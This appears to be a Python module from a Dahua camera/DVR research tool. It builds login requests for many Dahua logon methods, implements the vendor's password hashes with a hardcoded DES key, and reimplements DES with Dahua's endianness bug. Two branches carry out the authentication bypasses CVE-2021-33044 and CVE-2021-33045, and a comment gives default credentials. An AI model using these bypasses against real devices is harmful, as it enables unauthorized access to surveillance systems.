from utils import *
from datetime import datetime

""" For Dahua DES/3DES """
ENCRYPT = 0x00
DECRYPT = 0x01


def dahua_logon(logon=None, query_args=None, username=None, password=None, saved_host=None, init=False):
    """
    Dahua logon types

    args: logon: '3des',
    args: username -or- password, des_mode=ENCRYPT (default) | DECRYPT

    args: logon: 'dvrip',
    args: username, password, dh_random (option: saved_host)

    required: init=True, username (return required arguments for first logon with DHIP/HTTP)
    args: logon:

    """

    """ DVRIP/DES start """
    if logon == '3des':
        params = {
            "username": dahua_gen0_hash(username, ENCRYPT),
            "password": dahua_gen0_hash(password, ENCRYPT)
        }
        return params

    elif logon == 'dvrip':
        dh_realm = query_args.get('realm')
        dh_random = query_args.get('random')

        dvrip_hash = username + '&&'
        dvrip_hash += dahua_gen2_md5_hash(
            dh_random=dh_random, dh_realm=dh_realm, username=username, password=password, saved_host=saved_host)
        # OldDigestMD5 ??
        dvrip_hash += dahua_dvrip_md5_hash(
            dh_random, username, password, saved_host)
        params = {
            "hash": dvrip_hash
        }
        return params
    """ DVRIP/DES end """

    """ DHIP/http/https: First login start """
    params = {
        "userName": username,
        "password": "",
        "clientType": "Web3.0",
        "loginType": "Direct",
    }

    if logon == 'wsse':
        params.update({"clientType": "WSSE"})

    elif logon == 'onvif:plain' or logon == 'onvif:digest' or logon == 'onvif:onvif':
        params.update({"clientType": "Onvif"})
        params.update({"loginType": "Onvif"})

    if init:
        """ Retrieve necessary options for Second login """
        return params
    """ DHIP/http/https: First login end """

    """ DHIP/http/https: Second login start """
    password_type = {
        "Plain": "Plain",
        "Basic": "Basic",
        "OldDigest": "OldDigest",
        "Default": "Default",
        "Onvif": "Onvif",
        "2DCode": "2DCode"  # params.code
    }

    authority_type = {
        "Plain": "Plain",
        "Basic": "Basic",
        "OldDigest": "OldDigest",
        "Default": "Default",
        "Onvif": "Onvif",
        "2DCode": "2DCode",  # params.code
        "Ushield": "Ushield"
    }

    query_args = query_args.get('params')

    dh_random = query_args.get('random')
    dh_realm = query_args.get('realm')
    encryption = query_args.get('encryption')
    """ authorization: Not known usage, unique for each device but not random """
    # authorization = query_args.get('authorization')
    # mac_address = query_args.get('mac')

    """ DHIP/http/https: Second login, set default params """
    params = {
        # "random": dh_random,  # With 'clientType' = 'Local'
        # "realm": dh_realm,  # With 'clientType' = 'Local'
        "userName": username,
        "ipAddr": "127.0.0.1",
        "loginType": "Direct",
        "clientType": "Console",
        "authorityType": authority_type.get(encryption),  # Default, OldDigest
        "passwordType": password_type.get(encryption),  # Default, Plain

    }
    """ No idea what it is used for """
    # params.update({"stochasticId": 31337})

    """ DHIP/http/https: Second login, update default params with correct details """
    if logon == 'plain' or encryption == 'Plain':
        params.update({
            "passwordType": "Plain",
            "password": password
        })

    elif logon == 'basic' or encryption == 'Basic':
        params.update({
            # "passwordType": "Basic",
            "password": b64e(username.encode('latin-1') + b':' + password.encode('latin-1'))
        })

    elif logon == 'old_digest' or encryption == 'OldDigest':
        params.update({
            "passwordType": "OldDigest",
            "password": dahua_gen1_hash(password)
        })

    elif logon == 'default' or encryption == 'Default':
        dh_hash = dahua_gen2_md5_hash(
            username=username, password=password, dh_realm=dh_realm, dh_random=dh_random,
            saved_host=saved_host)

        params.update({
            "passwordType": "Default",
            "password": dh_hash
        })

    """ If we have chosen one of these logon, return """
    if logon in ['plain', 'basic', 'old_digest', 'old_digest_md5', 'default']:
        return params

    """ Otherwise check and update for other logon types """
    # Authentication bypass start
    if logon == "netkeyboard":
        """ 'CVE-2021-33044, Authentication bypass,
        when setting param: 'clientType": "NetKeyboard' """
        params.update({
            "clientType": "NetKeyboard"
        })
        return params

    elif logon == "loopback":
        """ loginType=5, @127.0.0.1 """
        """
        'CVE-2021-33045, Authentication bypass,
        when setting params: 'ipAddr':'127.0.0.1', 'loginType': 'Loopback' and 'clientType': 'Local'
        Note: Bypass fixed with newer firmware from beginning/mid 2020
        
        Legit usage: SNMP daemon traffic on 127.0.0.1 using port 5000 with l/p admin/admin
        """

        dh_hash = dahua_gen2_md5_hash(
            username=username, password=password, dh_realm=dh_realm, dh_random=dh_random,
            saved_host=saved_host)

        params.update({
            "loginType": "Loopback",
            "clientType": "Local",
            "passwordType": "Default",      # Plain working too
            "password": dh_hash     # Clear text password working too with 'passwordType': 'Plain'
        })

        return params
    # Authentication bypass end

    elif logon == "gui":
        """ TEST """
        # username = 'default'
        # password = 'tluafed'

        dh_hash = dahua_gen2_md5_hash(
            username=username, password=password, dh_realm=dh_realm, dh_random=dh_random,
            saved_host=saved_host)

        params.update({
            "loginType": "GUI",
            "clientType": "Dahua3.0-Web3.0-NOTIE",
            "passwordType": "Direct",
            "ipAddr": "127.0.0.1",
            "password": dh_hash
        })

        return params

    elif logon == 'onvif:plain':
        params.update({
            "loginType": "Onvif",
            "clientType": "Onvif",
            "authorityType": "Onvif",
            "passwordType": "Plain",
            "password": password,
        })
        return params

    elif logon == 'onvif:onvif':

        params.update({
            "loginType": "Onvif",
            "clientType": "Onvif",
            "authorityType": "Onvif",
            "passwordType": "Onvif",
        })

        dh_params = dahua_onvif_sha1_hash(dh_random=dh_random, password=password, saved_host=saved_host)

        params.update(dh_params)
        return params

    elif logon == 'onvif:digest':
        """ Always use UTC for 'created' """
        created = datetime.utcnow().isoformat(timespec='seconds') + 'Z'
        """ Newer firmware has another REALM, can be retrieved from HTTP OPTIONS/RTSP call, see dahua_dhip_login() """
        dh_hash = dahua_digest_md5_hash(
            username=username, password=password, dh_realm=dh_realm, dh_random=dh_random,
            saved_host=saved_host, created=created)

        params.update({
            "loginType": "Onvif",
            "clientType": "Onvif",
            "authorityType": "Onvif",
            "passwordType": "HttpDigest",
            "authorityInfo": created,
            "password": dh_hash
        })
        return params

    elif logon == 'rtsp':
        """ Always use UTC for created """
        created = datetime.utcnow().isoformat(timespec='seconds') + 'Z'
        dh_hash = dahua_digest_md5_hash(
            username=username, password=password, dh_realm=dh_realm, dh_random=dh_random,
            saved_host=saved_host, created=created)

        params.update({
            "clientType": "RtspClient",
            "authorityType": "HttpDigest",
            # Not needed in new FW, but the passwordType is there w/ "authorityType": "OldDigest"
            "passwordType": "HttpDigest",
            "password": dh_hash,
            "authorityInfo": created
        })
        return params

    elif logon == 'wsse':
        """
        Cloud Upgrade WSSE logon
        Note:
            Can _only_ be used once per boot
            Correct time and time zone on device very important so it will match 'created'
        """

        """ Always use UTC for created """
        created = datetime.utcnow().isoformat(timespec='seconds') + 'Z'
        dh_hash = dahua_gen2_md5_hash(
            username=username, password=password, dh_realm=dh_realm, dh_random=dh_random,
            saved_host=saved_host, return_hash=True)

        hash_digest = hashlib.sha1()
        hash_digest.update(created.encode('ascii'))
        hash_digest.update(dh_hash.encode('ascii'))

        params.update({
            "clientType": "WSSE",
            "authorityType": "OTP",
            "passwordType": "WSSE",
            "password": b64e(hash_digest.digest()),
            "authorityInfo": created
        })
        return params

    elif logon == 'ldap':
        """ loginType=3, Unknown login procedure """
        params.update({
            "loginType": "LDAP"
        })
        return params

    elif logon == 'ad':
        """ loginType=4, Unknown login procedure """
        params.update({
            "loginType": "ActiveDirectory"
        })
        return params

    elif logon == 'cms':
        """ loginType=1, Unknown login procedure """
        params.update({
            "loginType": "CMS",
        })
        return params

    elif logon == 'ushield':
        """ Unknown login procedure """
        params.update({
            "authorityType": "Ushield",
            "authorityInfo": "XXXXXXX"
            # "passwordType": "Ushield",
            # "clientType": "Ushield",
            # "loginType": "Ushield",
        })
        return params

    elif logon == 'local':
        """ Unknown login procedure """
        params.update({
            "clientType": "Local",
            "loginType": "Local",
            # "authorityType": "Local",
            # "passwordType": "Local"
        })
        return params

    elif logon == 'maybe_iot_or_azure':
        """ Unknown login procedure """
        params.update({
            "deviceId": "Unknown",  # Required for 'dasToken'
            "dasToken": "Unknown"  # depending of 'deviceId'
        })
        return params

    else:
        log.failure('Unknown logon method')
        return None


def _compressor(in_var, out):
    """ From: https://github.com/haicen/DahuaHashCreator/blob/master/DahuaHash.py """
    i = 0
    j = 0

    while i < len(in_var):
        # python 2.x (thanks to @davidak501)
        # out[j] = (ord(in_var[i]) + ord(in_var[i+1])) % 62;
        # python 3.x
        out[j] = (in_var[i] + in_var[i + 1]) % 62
        if out[j] < 10:
            out[j] += 48
        elif out[j] < 36:
            out[j] += 55
        else:
            out[j] += 61

        i = i + 2
        j = j + 1


def dahua_gen1_hash(password):
    """ From: https://github.com/haicen/DahuaHashCreator/blob/master/DahuaHash.py """
    m = hashlib.md5()
    m.update(password.encode("latin-1"))

    s = m.digest()
    crypt = []
    for b in s:
        crypt.append(b)

    out2 = [''] * 8
    _compressor(crypt, out2)
    dh_data = ''.join([chr(c) for c in out2])

    return dh_data


def basic_auth(username, password):

    return b64e(username.encode('latin-1') + b':' + password.encode('latin-1'))


def dahua_dvrip_md5_hash(dh_random=None, username=None, password=None, saved_host=None):
    """ Dahua (gen1) DVRIP random MD5 password hash """

    return hashlib.md5(
        (username + ':' + dh_random + ':' + saved_host.get('password').get('gen1') if password is None else
         dahua_gen1_hash(password)).encode('latin-1')
    ).hexdigest().upper()


def dahua_gen2_md5_hash(
        dh_random=None, dh_realm=None, username=None, password=None, saved_host=None, return_hash=False):
    """ Dahua (gen2) DHIP/WEB random MD5 password hash """

    dh_hash = saved_host.get('password').get('gen2') if password is None else hashlib.md5(
        (username + ':' + dh_realm + ':' + password).encode('latin-1')
    ).hexdigest().upper()

    if return_hash:
        return dh_hash

    return hashlib.md5(
        (username + ':' + dh_random + ':' + dh_hash).encode('latin-1')
    ).hexdigest().upper()


def dahua_digest_md5_hash(dh_random=None, dh_realm=None, username=None, password=None, saved_host=None, created=None):
    """ Dahua (digest) DHIP/WEB random MD5 password hash """

    dh_hash = saved_host.get('password').get('gen2').lower() if saved_host else hashlib.md5(
        (username + ':' + dh_realm + ':' + password).encode('latin-1')
    ).hexdigest()
    return hashlib.md5(
        (dh_hash + ':' + dh_random + ':' + created).encode('ascii')
    ).hexdigest()


def dahua_onvif_sha1_hash(dh_random=None, password=None, device_random=False, saved_host=None):
    """ Dahua (onvif) DHIP/WEB random SHA1 password hash """

    if password is None and saved_host is not None:
        dh_params = saved_host.get('password').get('onvif', None)
        return dh_params

    authority_info = os.urandom(20)

    if device_random:
        # Use original 'dh_random' from device
        dh_random = dh_random.encode('ascii')
    else:
        # Or, we can set random to what we want
        dh_random = os.urandom(20)

    hash_digest = hashlib.sha1()
    hash_digest.update((dh_random + authority_info + password.encode('ascii')))

    return {
        "authorityInfo": b64e(authority_info),
        "password": b64e(hash_digest.digest()),
        "random": b64e(dh_random)
    }


def dahua_gen0_hash(dh_data, des_mode):
    """The DES/3DES code in the bottom of this script."""

    # "secret" key for Dahua Technology
    key = b'poiuytrewq'  # 3DES

    if len(dh_data) > 8:  # Max 8 bytes!
        log.failure(f"'{dh_data}' is more than 8 bytes, this will most probably fail")
    dh_data = dh_data[0:8]
    data_len = len(dh_data)

    key_len = len(key)

    """ padding key with 0x00 if needed """
    if key_len <= 8:
        if not (key_len % 8) == 0:
            # key += p8(0x0) * (8 - (key_len % 8))  # DES (8 bytes)
            key += b'\x00' * (8 - (key_len % 8))  # DES (8 bytes)
    elif key_len <= 16:
        if not (key_len % 16) == 0:
            # key += p8(0x0) * (16 - (key_len % 16))  # 3DES DES-EDE2 (16 bytes)
            key += b'\x00' * (16 - (key_len % 16))  # 3DES DES-EDE2 (16 bytes)
    elif key_len <= 24:
        if not (key_len % 24) == 0:
            # key += p8(0x0) * (24 - (key_len % 24))  # 3DES DES-EDE3 (24 bytes)
            key += b'\x00' * (24 - (key_len % 24))  # 3DES DES-EDE3 (24 bytes)

    """ padding key with 0x00 if needed """
    if not (data_len % 8) == 0:
        # dh_data += p8(0x0).decode('latin-1') * (8 - (data_len % 8))
        dh_data += '\x00' * (8 - (data_len % 8))

    if key_len == 8:
        k = Des(key)
    else:
        k = TripleDes(key)

    if des_mode == ENCRYPT:
        dh_data = k.encrypt(dh_data.encode('latin-1'))
    else:
        dh_data = k.decrypt(dh_data)
        dh_data = dh_data.decode('latin-1').strip('\x00')  # Strip all 0x00 padding

    return dh_data


"""
[WARNING!] Do NOT reuse below code for legit DES/3DES! [WARNING!]
This code has been cleaned and modified so it will fit my needs to
replicate Dahua's implementation of DES/3DES with endianness bugs.

[This code is based based on]
A pure python implementation of the DES and TRIPLE DES encryption algorithms.
Author:   Todd Whitman's
Homepage: http://twhiteman.netfirms.com/des.html
"""


class _BaseDes(object):
    """ The base class shared by des and triple des """

    def __init__(self):
        self.block_size = 8
        self.__key = None

    def get_key(self):
        """get_key() -> bytes"""
        return self.__key

    def set_key(self, key):
        """Will set the crypting key for this object."""
        self.__key = key


class Des(_BaseDes):
    """ DES """

    """ Permutation and translation tables for DES """
    __pc1 = [
        56, 48, 40, 32, 24, 16,  8,
        0, 57, 49, 41, 33, 25, 17,
        9,  1, 58, 50, 42, 34, 26,
        18, 10,  2, 59, 51, 43, 35,
        62, 54, 46, 38, 30, 22, 14,
        6, 61, 53, 45, 37, 29, 21,
        13,  5, 60, 52, 44, 36, 28,
        20, 12,  4, 27, 19, 11,  3
    ]

    """ number left rotations of pc1 """
    __left_rotations = [
        1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1
    ]

    """ permuted choice key (table 2) """
    __pc2 = [
        13, 16, 10, 23,  0,  4,
        2, 27, 14,  5, 20,  9,
        22, 18, 11,  3, 25,  7,
        15,  6, 26, 19, 12,  1,
        40, 51, 30, 36, 46, 54,
        29, 39, 50, 44, 32, 47,
        43, 48, 38, 55, 33, 52,
        45, 41, 49, 35, 28, 31
    ]

    # initial permutation IP
    __ip = [
        57, 49, 41, 33, 25, 17, 9,  1,
        59, 51, 43, 35, 27, 19, 11, 3,
        61, 53, 45, 37, 29, 21, 13, 5,
        63, 55, 47, 39, 31, 23, 15, 7,
        56, 48, 40, 32, 24, 16, 8,  0,
        58, 50, 42, 34, 26, 18, 10, 2,
        60, 52, 44, 36, 28, 20, 12, 4,
        62, 54, 46, 38, 30, 22, 14, 6
    ]

    # Expansion table for turning 32 bit blocks into 48 bits
    __expansion_table = [
        31,  0,  1,  2,  3,  4,
        3,  4,  5,  6,  7,  8,
        7,  8,  9, 10, 11, 12,
        11, 12, 13, 14, 15, 16,
        15, 16, 17, 18, 19, 20,
        19, 20, 21, 22, 23, 24,
        23, 24, 25, 26, 27, 28,
        27, 28, 29, 30, 31,  0
    ]

    # The (in)famous S-boxes
    __sbox = [
        # S1
        [
            14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7,
            0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8,
            4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0,
            15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13
        ],

        # S2
        [
            15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10,
            3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5,
            0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15,
            13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9
        ],

        # S3
        [
            10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8,
            13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1,
            13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7,
            1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12
        ],

        # S4
        [
            7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15,
            13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9,
            10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4,
            3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14
        ],

        # S5
        [
            2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9,
            14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6,
            4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14,
            11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3
        ],

        # S6
        [
            12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11,
            10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8,
            9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6,
            4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13
        ],

        # S7
        [
            4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1,
            13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6,
            1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2,
            6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12
        ],

        # S8
        [
            13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7,
            1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2,
            7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8,
            2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11
        ],
    ]

    """ 32-bit permutation function P used on the output of the S-boxes """
    __p = [
        15, 6, 19, 20, 28, 11,
        27, 16, 0, 14, 22, 25,
        4, 17, 30, 9, 1, 7,
        23, 13, 31, 26, 2, 8,
        18, 12, 29, 5, 21, 10,
        3, 24
    ]

    """ final permutation IP^-1 """
    __fp = [
        39,  7, 47, 15, 55, 23, 63, 31,
        38,  6, 46, 14, 54, 22, 62, 30,
        37,  5, 45, 13, 53, 21, 61, 29,
        36,  4, 44, 12, 52, 20, 60, 28,
        35,  3, 43, 11, 51, 19, 59, 27,
        34,  2, 42, 10, 50, 18, 58, 26,
        33,  1, 41,  9, 49, 17, 57, 25,
        32,  0, 40,  8, 48, 16, 56, 24
    ]

    """ Initialisation """
    def __init__(self, key):
        _BaseDes.__init__(self)
        self.key_size = 8
        self.L = []
        self.R = []
        self.Kn = [[0] * 48] * 16  # 16 48-bit keys (K1 - K16)
        self.final = []

        self.set_key(key)

    def set_key(self, key):
        """Will set the crypto key for this object. Must be 8 bytes."""
        _BaseDes.set_key(self, key)
        self.__create_sub_keys()

    @staticmethod
    def __string_to_bitlist(dh_data):
        """Turn the string data, into a list of bits (1, 0)'s"""
        return bits(dh_data, endian='little')  # Dahua endianness bug

    @staticmethod
    def __bitlist_to_string(dh_data):
        """Turn the list of bits -> data, into a string"""
        return bytes(list(unbits(dh_data, endian='little')))  # Dahua endianness bug

    @staticmethod
    def __permutate(table, block):
        """Permutate this block with the specified table"""
        return list(map(lambda x: block[x], table))

    """
    Transform the secret key, so that it is ready for data processing
    Create the 16 subkeys, K[1] - K[16]
    """
    def __create_sub_keys(self):
        """Create the 16 subkeys K[1] to K[16] from the given key"""
        key = self.__permutate(Des.__pc1, self.__string_to_bitlist(self.get_key()))
        i = 0
        # Split into Left and Right sections
        self.L = key[:28]
        self.R = key[28:]

        while i < 16:
            j = 0
            # Perform circular left shifts
            while j < Des.__left_rotations[i]:
                self.L.append(self.L[0])
                del self.L[0]

                self.R.append(self.R[0])
                del self.R[0]
                j += 1
            # Create one of the 16 subkeys through pc2 permutation
            self.Kn[i] = self.__permutate(Des.__pc2, self.L + self.R)
            i += 1

    # Main part of the encryption algorithm, the number cruncher :)
    def __des_crypt(self, block, crypt_type):
        """Crypt the block of data through DES bit-manipulation"""
        block = self.__permutate(Des.__ip, block)

        self.L = block[:32]
        self.R = block[32:]

        # Encryption starts from Kn[1] through to Kn[16]
        if crypt_type == ENCRYPT:
            iteration = 0
            iteration_adjustment = 1
        # Decryption starts from Kn[16] down to Kn[1]
        else:
            iteration = 15
            iteration_adjustment = -1

        i = 0
        while i < 16:
            # Make a copy of R[i-1], this will later become L[i]
            if crypt_type == ENCRYPT:
                temp_r = self.R[:]
            else:
                temp_r = self.L[:]

            # Permutate R[i - 1] to start creating R[i]
            if crypt_type == ENCRYPT:
                self.R = self.__permutate(Des.__expansion_table, self.R)
            else:
                self.L = self.__permutate(Des.__expansion_table, self.L)

            # Exclusive or R[i - 1] with K[i], create B[1] to B[8] whilst here
            if crypt_type == ENCRYPT:
                self.R = list(map(lambda x, y: x ^ y, self.R, self.Kn[iteration]))
                _b = [
                    self.R[:6],
                    self.R[6:12],
                    self.R[12:18],
                    self.R[18:24],
                    self.R[24:30],
                    self.R[30:36],
                    self.R[36:42],
                    self.R[42:]
                ]
            else:
                self.L = list(map(lambda x, y: x ^ y, self.L, self.Kn[iteration]))
                _b = [
                    self.L[:6],
                    self.L[6:12],
                    self.L[12:18],
                    self.L[18:24],
                    self.L[24:30],
                    self.L[30:36],
                    self.L[36:42],
                    self.L[42:]
                ]

            # Permutate _b[1] to _b[8] using the S-Boxes
            j = 0
            _bn = []
            while j < 8:

                # Work out the offsets
                m = (_b[j][0] << 1) + _b[j][5]
                n = (_b[j][1] << 3) + (_b[j][2] << 2) + (_b[j][3] << 1) + _b[j][4]

                # Find the permutation value
                v = Des.__sbox[j][(m << 4) + n]

                # Turn value into bits, add it to result: _bn
                for tmp in list(map(lambda x: x, bits(v, endian='little')[:4])):  # Dahua endianness bug
                    _bn.append(tmp)

                j += 1

            # Permutate the concatination of _b[1] to _b[8] (_bn)
            if crypt_type == ENCRYPT:
                self.R = self.__permutate(Des.__p, _bn)
            else:
                self.L = self.__permutate(Des.__p, _bn)

            # Xor with L[i - 1]
            if crypt_type == ENCRYPT:
                self.R = list(map(lambda x, y: x ^ y, self.R, self.L))
            else:
                self.L = list(map(lambda x, y: x ^ y, self.R, self.L))

            # L[i] becomes R[i - 1]
            if crypt_type == ENCRYPT:
                self.L = temp_r
            else:
                self.R = temp_r

            i += 1
            iteration += iteration_adjustment

        # Final permutation of R[16]L[16]
        if crypt_type == ENCRYPT:
            self.final = self.__permutate(Des.__fp, self.L + self.R)
        else:
            self.final = self.__permutate(Des.__fp, self.L + self.R)
        return self.final

    def crypt(self, dh_data, crypt_type):
        """Crypt the data in blocks, running it through des_crypt()"""

        # Error check the data
        if not dh_data:
            return ''

        # Split the data into blocks, crypting each one separately
        i = 0
        # dict = {}
        result = []

        while i < len(dh_data):

            block = self.__string_to_bitlist(dh_data[i:i + 8])
            processed_block = self.__des_crypt(block, crypt_type)

            # Add the resulting crypted block to our list
            result.append(self.__bitlist_to_string(processed_block))
            i += 8

        # Return the full crypted string
        return bytes.fromhex('').join(result)

    def encrypt(self, dh_data):

        return self.crypt(dh_data, ENCRYPT)

    def decrypt(self, dh_data):

        return self.crypt(dh_data, DECRYPT)


class TripleDes(_BaseDes):
    """Triple DES"""

    def __init__(self, key):
        _BaseDes.__init__(self)
        self.key_size = None
        self.__key1 = None
        self.__key2 = None
        self.__key3 = None

        self.set_key(key)

    def set_key(self, key):
        """Will set the crypting key for this object. Either 16 or 24 bytes long."""
        self.key_size = 24  # Use DES-EDE3 mode
        if len(key) != self.key_size:
            if len(key) == 16:  # Use DES-EDE2 mode
                self.key_size = 16

        self.__key1 = Des(key[:8])
        self.__key2 = Des(key[8:16])
        if self.key_size == 16:
            self.__key3 = self.__key1
        else:
            self.__key3 = Des(key[16:])

        _BaseDes.set_key(self, key)

    def encrypt(self, dh_data):

        dh_data = self.__key1.crypt(dh_data, ENCRYPT)
        dh_data = self.__key2.crypt(dh_data, DECRYPT)
        dh_data = self.__key3.crypt(dh_data, ENCRYPT)
        return dh_data

    def decrypt(self, dh_data):
        dh_data = self.__key3.crypt(dh_data, DECRYPT)
        dh_data = self.__key2.crypt(dh_data, ENCRYPT)
        dh_data = self.__key1.crypt(dh_data, DECRYPT)
        return dh_data
